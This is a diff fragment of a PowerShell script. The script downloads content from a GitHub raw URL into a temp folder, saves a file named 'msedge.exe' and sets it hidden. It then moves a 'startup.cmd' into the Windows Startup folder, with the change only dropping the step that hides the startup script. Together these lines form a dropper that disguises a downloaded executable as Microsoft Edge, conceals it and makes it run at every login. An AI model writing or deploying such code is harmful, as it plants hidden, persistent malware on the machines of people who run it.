@@ -11,12 +11,10 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BDtools/mai
 
 $folderPath = "$env:temp\sVBXKuz"
 $file = Join-Path $folderPath "msedge.exe"
-$file2 = Join-Path $folderPath "startup.cmd"
 
 $attr = [System.IO.FileAttributes]::Hidden
-
 Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attributes -bor $attr)
-Set-ItemProperty -Path $file2 -Name Attributes -Value ((Get-Item $file2).Attributes -bor $attr)
+
 
 
 Move-Item "startup.cmd" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd"
